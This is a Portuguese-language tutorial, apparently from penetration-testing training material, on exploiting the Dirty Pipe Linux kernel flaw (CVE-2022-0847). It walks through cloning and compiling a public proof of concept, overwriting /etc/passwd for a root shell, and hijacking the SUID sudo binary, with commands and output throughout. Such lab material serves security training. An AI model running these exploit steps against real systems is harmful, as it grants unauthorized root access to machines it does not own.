Uma vulnerabilidade no kernel do Linux, chamada [Dirty Pipe](https://dirtypipe.cm4all.com/) ( [CVE-2022-0847](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0847) ), permite a gravação não autorizada em arquivos de usuário root no Linux. Todos os kernels da versão `5.8`para `5.17`são afetados e vulneráveis ​​a essa vulnerabilidade.

Essa vulnerabilidade permite que um usuário grave em arquivos arbitrários, desde que tenha acesso de leitura a esses arquivos. 

Esta vulnerabilidade é baseada em pipes. Pipes são um mecanismo de comunicação unidirecional entre processos que são particularmente populares em sistemas Unix. Por exemplo, poderíamos editar o `/etc/passwd`arquivo e remover o prompt de senha para o root. Isso nos permitiria fazer login com o `su`comando sem o prompt de senha.

Para explorar essa vulnerabilidade, precisamos baixar um [PoC](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits) e compilá-lo no próprio sistema de destino ou em uma cópia que fizemos.

#### Baixar Dirty Pipe Exploit
```shell-session
cry0l1t3@nix02:~$ git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
cry0l1t3@nix02:~$ cd CVE-2022-0847-DirtyPipe-Exploits
cry0l1t3@nix02:~$ bash compile.sh
```

Após compilar o código, temos dois exploits diferentes disponíveis. A primeira versão do exploit ( `exploit-1`) modifica o `/etc/passwd`e nos dá um prompt com privilégios de root. Para isso, precisamos verificar a versão do kernel e então executar o exploit.

#### Verificar versão do kernel
```shell-session
cry0l1t3@nix02:~$ uname -r

5.13.0-46-generic
```

#### Exploração
```shell-session
cry0l1t3@nix02:~$ ./exploit-1

Backing up /etc/passwd to /tmp/passwd.bak ...
Setting root password to "piped"...
Password: Restoring /etc/passwd from /tmp/passwd.bak...
Done! Popping shell... (run commands now)

id

uid=0(root) gid=0(root) groups=0(root)
```

Com a ajuda da 2ª versão do exploit ( `exploit-2`), podemos executar binários SUID com privilégios de root. No entanto, antes de fazermos isso, precisamos primeiro encontrar esses binários SUID. Para isso, podemos usar o seguinte comando:

#### Encontre binários SUID
```shell-session
cry0l1t3@nix02:~$ find / -perm -4000 2>/dev/null

/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/xorg/Xorg.wrap
/usr/sbin/pppd
/usr/bin/chfn
/usr/bin/su
/usr/bin/chsh
/usr/bin/umount
/usr/bin/passwd
/usr/bin/fusermount
/usr/bin/sudo
/usr/bin/vmware-user-suid-wrapper
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/pkexec
/usr/bin/newgrp
```

Então podemos escolher um binário e especificar o caminho completo do binário como um argumento para o exploit e executá-lo.

#### Exploração
```shell-session
cry0l1t3@nix02:~$ ./exploit-2 /usr/bin/sudo

[+] hijacking suid binary..
[+] dropping suid shell..
[+] restoring suid binary..
[+] popping root shell.. (dont forget to clean up /tmp/sh ;))

# id

uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),1000(cry0l1t3)
```